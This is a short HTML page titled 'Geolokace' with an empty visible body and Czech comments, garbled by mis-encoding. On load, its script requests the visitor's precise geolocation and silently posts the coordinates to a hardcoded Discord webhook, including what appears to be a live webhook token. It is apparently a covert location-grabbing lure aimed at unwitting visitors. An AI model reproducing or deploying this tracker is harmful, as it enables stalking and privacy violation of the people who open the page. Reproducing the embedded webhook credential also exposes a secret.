<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahra캞 sv칳m webhookem

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            }
        }

        function sendToDiscord(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const data = {
                content: `游늸 Nov치 poloha:\n游깴 Zem캩pisn치 코칤콏ka: ${lat}\n游깴 Zem캩pisn치 d칠lka: ${lon}`
            };

            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    console.error("Chyba p콏i odes칤l치n칤:", response.statusText);
                }
            })
            .catch(error => console.error("Chyba:", error));
        }

        function showError(error) {
            console.error("Chyba p콏i z칤sk치v치n칤 polohy:", error.message);
        }

        window.onload = getLocation;
    </script>
</head>
<body>
</body>
</html>
